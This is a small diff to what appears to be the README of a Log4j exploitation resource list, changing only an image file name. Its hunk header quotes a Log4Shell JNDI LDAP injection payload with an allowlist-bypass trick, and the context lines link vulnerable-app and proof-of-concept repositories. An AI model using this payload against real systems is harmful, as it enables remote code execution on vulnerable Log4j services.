@@ -305,6 +305,6 @@ ${jndi:ldap://127.0.0.1#127.0.0.1:1389/poc}
 - https://github.com/tothi/log4shell-vulnerable-app
 - https://github.com/Anonymous-ghost/log4jVul
 
-![](TEMP/WX.png)
+![](TEMP/wx.png)
 
 [![Stargazers over time](https://starchart.cc//0e0w/HackLog4j.svg)](https://starchart.cc/0e0w/HackLog4j)
